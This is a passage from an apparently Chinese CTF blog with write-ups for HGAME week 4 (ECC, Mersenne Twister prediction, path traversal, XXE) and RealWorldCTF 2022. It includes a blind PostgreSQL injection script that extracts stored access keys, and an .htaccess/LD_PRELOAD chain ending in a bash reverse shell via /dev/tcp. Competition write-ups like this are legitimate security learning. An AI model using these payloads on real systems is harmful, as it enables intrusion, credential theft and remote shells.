class="line">        r = requests.post(url, headers=header, data=json.dumps(payload))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            R = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            L = mid</span><br><span class="line">    ans += <span class="built_in">chr</span>(L)</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">CREATE TABLE `uuussseeerrrsss` (</span></span><br><span class="line"><span class="string">    `id` integer,</span></span><br><span class="line"><span class="string">    `created_at` datetime,</span></span><br><span class="line"><span class="string">    `updated_at` datetime,</span></span><br><span class="line"><span class="string">    `deleted_at` datetime,</span></span><br><span class="line"><span class="string">    `username` text UNIQUE,</span></span><br><span class="line"><span class="string">    `password` text,</span></span><br><span class="line"><span class="string">    PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="string">),CREATE INDEX `idx_uuussseeerrrsss_deleted_at` ON `uuussseeerrrsss`(`deleted_at`)         </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="crypto-1"><a href="#crypto-1" class="headerlink" title="crypto"></a>crypto</h3><h4 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sage: p = <span class="number">74997021559434065975272431626618720725838473091721936616560359000648651891507</span></span><br><span class="line">....: a = <span class="number">61739043730332859978236469007948666997510544212362386629062032094925353519657</span></span><br><span class="line">....: b = <span class="number">87821782818477817609882526316479721490919815013668096771992360002467657827319</span></span><br><span class="line">....: k = <span class="number">93653874272176107584459982058527081604083871182797816204772644509623271061231</span></span><br><span class="line">....:</span><br><span class="line">sage: E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">sage: c1 = E(<span class="number">14455613666211899576018835165132438102011988264607146511938249744871964946084</span>,<span class="number">25506582570581289714612640493</span></span><br><span class="line">....: <span class="number">258299813803157561796247330693768146763035791942</span>)</span><br><span class="line">....: c2 = E(<span class="number">37554871162619456709183509122673929636457622251880199235054734523782483869931</span>, <span class="number">7139205554061673653926796098</span></span><br><span class="line">....: <span class="number">9304287083629288530398474590782366384873814477806</span>)</span><br><span class="line">sage: cipher_left = <span class="number">68208062402162616009217039034331142786282678107650228761709584478779998734710</span></span><br><span class="line">....: cipher_right = <span class="number">27453988545002384546706933590432585006240439443312571008791835203660152890619</span></span><br><span class="line">....:</span><br><span class="line">sage: m = c1-c2*k</span><br><span class="line">sage: <span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line">sage: n2s(<span class="built_in">int</span>(cipher_left//m[<span class="number">0</span>]))</span><br><span class="line"><span class="string">b&#x27;hgame&#123;Ecc$&#x27;</span></span><br><span class="line">sage: n2s(<span class="built_in">int</span>(cipher_right//m[<span class="number">1</span>]))</span><br><span class="line"><span class="string">b&#x27;is!sO@HaRd&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="PRNG"><a href="#PRNG" class="headerlink" title="PRNG"></a>PRNG</h4><p>梅森旋转向后预测</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> mt19937predictor <span class="keyword">import</span> MT19937Predictor</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">888058162</span>, <span class="number">3</span>*****]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">3437104340</span>, <span class="number">5</span>*****]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>predictor = MT19937Predictor()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line"><span class="meta">... </span>    predictor.setrandbits(a[i], <span class="number">32</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line"><span class="meta">... </span>    flag += n2s(predictor.getrandbits(<span class="number">32</span>) ^ i)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line"><span class="string">b&#x27;hgame&#123;meRsenne!tWisTER~iS^A*WIDelY-USEd^pSEUDo&amp;rAndOM:nUmBEr!GeNErATIon?AlgorIThM&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h3><h4 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl --path-as-is -X CONNECT http://1e4c3338e4.filesystem.hgame.homeboyc.cn/main.go/../there_may_be_a_flag</span></span><br><span class="line">hgame&#123;79f33a8b9913e797c56375c6a78865dc439578f70d572b9a402f1ad57f7eb856&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h4><p>代码中允许引入外部实体，<code>libxml_disable_entity_loader(false);</code></p>
<p>协议过滤的比较死，但是能通过<code>compress.zlib://</code>这个协议拿到<code>/etc/passwd</code>这种，但是还是拿不到源码，因为源码里有php。</p>
<p>于是利用data协议的输入流，将输入流base64，将外部实体导入到<code>&lt;sender&gt;</code>当中，绕过waf。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;data://text/plain;base64,YWRtaW4=&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span><span class="tag">&lt;<span class="name">sender</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">sender</span>&gt;</span><span class="tag">&lt;<span class="name">content</span>&gt;</span><span class="tag">&lt;/<span class="name">content</span>&gt;</span>sb<span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>pil1ow师傅的做法非预期了，用html实体编码绕，不用引入外部实体。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span><span class="tag">&lt;<span class="name">sender</span>&gt;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#100;</span><span class="symbol">&amp;#109;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#110;</span><span class="tag">&lt;/<span class="name">sender</span>&gt;</span><span class="tag">&lt;<span class="name">content</span>&gt;</span>sb<span class="tag">&lt;/<span class="name">content</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>好文章：</p>
<blockquote>
<p><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#waf-and-protections-bypasses">XXE - XEE - XML External Entity - HackTricks</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>RWCTF2022</title>
    <url>/2022/01/28/RWCTF2022/</url>
    <content><![CDATA[<p>打rwctf，坐牢，补题。</p>
<p>但是收获真的好大。</p>
<span id="more"></span>
<h1 id="RealWorldCTF2022"><a href="#RealWorldCTF2022" class="headerlink" title="RealWorldCTF2022"></a>RealWorldCTF2022</h1><h2 id="Hack-into-Skynet"><a href="#Hack-into-Skynet" class="headerlink" title="Hack into Skynet"></a>Hack into Skynet</h2><p>postgresql注入，第一次接触postgresql是在去年的i春秋新年欢乐赛，当时啥也不会，第二次接触是在强网杯，依旧啥也不会，到现在，算是真的做了一个。</p>
<p>题目直接给了源码，是一个flask框架，用psycopg2连接postgresql进行一些操作，有一个未知的黑盒叫做Skynet，如果payload撞上会被403waf掉。</p>
<p>pil0w思路一开始是注这个SessionId,在上面经过一番尝试，能绕的waf都绕过去了，最终尝试的两个：</p>
<p><code>1&#39; or $quote$2$quote$=$quote$2$quote$ or &#39;</code>和<code>1&#39; and $quote$2$quote$=$quote$1$quote$--</code>在在线的<code>postgresql</code>下确认了语法没问题，可是始终没有预期结果，使我不禁怀疑了这种<code>%s</code>是否存在注入点。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query_login_state</span>():</span></span><br><span class="line">    sid = flask.request.cookies.get(<span class="string">&#x27;SessionId&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sid:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    now = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">with</span> psycopg2.connect(</span><br><span class="line">            host=<span class="string">&quot;challenge-db&quot;</span>,</span><br><span class="line">            database=<span class="string">&quot;ctf&quot;</span>,</span><br><span class="line">            user=<span class="string">&quot;ctf&quot;</span>,</span><br><span class="line">            password=<span class="string">&quot;ctf&quot;</span>) <span class="keyword">as</span> conn:</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(<span class="string">&quot;SELECT sessionid&quot;</span></span><br><span class="line">           <span class="string">&quot;  FROM login_session&quot;</span></span><br><span class="line">           <span class="string">&quot;  WHERE sessionid = %s&quot;</span></span><br><span class="line">           <span class="string">&quot;    AND valid_since &lt;= %s&quot;</span></span><br><span class="line">           <span class="string">&quot;    AND valid_until &gt;= %s&quot;</span></span><br><span class="line">           <span class="string">&quot;&quot;</span>, (sid, now, now))</span><br><span class="line">        data = [r <span class="keyword">for</span> r <span class="keyword">in</span> cursor.fetchall()]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bool</span>(data)</span><br></pre></td></tr></table></figure>
<p>做实验发现，%s做了一个类似字符串预处理的东西，会将单引号什么的进行转义，所以使用%s是安全的，反而，使用format是先对字符串进行的操作，然后作为整体拼进去，反而可能存在注入。</p>
<p> <a href="https://www.psycopg.org/docs/usage.html#passing-parameters-to-sql-queries">https://www.psycopg.org/docs/usage.html#passing-parameters-to-sql-queries</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://47.242.21.212:8085/&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;QWERTYUIOPASDFGHJKLZXCVBNM1234567890qwertyuiopasdfghjklzxcvbnm,./:;!@#$%^&amp;*()_+-=&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;&#x27;</span></span><br><span class="line">proxy=<span class="string">&#x27;127.0.0.1:8080&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://&#x27;</span>+proxy,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;https://&#x27;</span>+proxy,</span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># SELECT version() PostgreSQL13.5onx8664pclin</span></span><br><span class="line"><span class="comment"># SELECT string_agg(schema_name,&#x27;:&#x27;) FROM information_schema.schemata pg_catalog:public:information_schema</span></span><br><span class="line"><span class="comment"># SELECT string_agg(tablename, &#x27;:&#x27;) FROM pg_catalog.pg_tables WHERE schemaname=current_schema()</span></span><br><span class="line"><span class="comment"># target:target_credentials:login_session:exp:passwd:result:a:cmd_exec:passwd1:b:cmd_exec2</span></span><br><span class="line"><span class="comment"># test_content = &quot;SELECT &quot;</span></span><br><span class="line"><span class="comment"># test_content = &quot;SELECT string_agg(column_name, &#x27;:&#x27;) FROM information_schema.columns c WHERE c.table_name like &#x27;target_c%&#x27;&quot;</span></span><br><span class="line"><span class="comment"># target:    id:account:password:access_key:secret_key</span></span><br><span class="line">test_content = <span class="string">&quot;SELECT concat(secret_key,access_key) FROM target_credentials limit 1&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    L = <span class="number">0</span></span><br><span class="line">    R = <span class="number">127</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> table:</span><br><span class="line">        payload = <span class="string">&quot;name=1&#x27;or substr(--%%0d(%s),%d,1)=$quote$%c$quote$--&quot;</span> % (test_content, i, c)</span><br><span class="line"></span><br><span class="line">        r = requests.post(url = url, headers=headers, data = payload, cookies=&#123;<span class="string">&#x27;SessionId&#x27;</span>:<span class="string">&#x27;1ef535685e80693bca97ff5791d26ad0&#x27;</span>&#125;,proxies=proxies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Kill before&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(target)</span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="RWDN"><a href="#RWDN" class="headerlink" title="RWDN"></a>RWDN</h2><p><a href="https://blog.csdn.net/solitudi/article/details/116666720">[CTF].htaccess的使用技巧总结_Y4tacker的博客-CSDN博客</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryG9WWWEEOTX4T6bTg</span><br><span class="line">Content-Disposition: form-data; name=&quot;form-636080e5-e589-433d-9fa5-2e8ec0f5ba132&quot;; filename=&quot;2.txt&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">------WebKitFormBoundaryG9WWWEEOTX4T6bTg</span><br><span class="line">Content-Disposition: form-data; name=&quot;form-636080e5-e589-433d-9fa5-2e8ec0f5ba13&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">ErrorDocument 404 &quot;%&#123;file:/etc/passwd&#125;&quot;</span><br><span class="line">------WebKitFormBoundaryG9WWWEEOTX4T6bTg--</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/28/RWCTF2022/assets/image-20220128142212481.png" alt="image-20220128142212481"></p>
<p><code>ErrorDocument 404 &quot;%&#123;file:/etc/apache2/apache2.conf&#125;&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetEnv LD_PRELOAD /var/www/html/0d5391e5e415928adf66bb2275652534/1.txt</span><br><span class="line">SetOutputFilter 7f39f8317fgzip</span><br><span class="line">ErrorDocument 404 &quot;%&#123;file:/etc/apache2/apache2.conf&#125;&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># Include of directories ignores editors&#x27; and dpkg&#x27;s backup files,</span><br><span class="line"># see README.Debian for details.</span><br><span class="line">ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip</span><br><span class="line"></span><br><span class="line"># Include generic snippets of statements</span><br><span class="line">IncludeOptional conf-enabled/*.conf</span><br><span class="line"></span><br><span class="line"># Include the virtual host configurations:</span><br><span class="line">IncludeOptional sites-enabled/*.conf</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxxxxxxxxx/9999 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
</search>
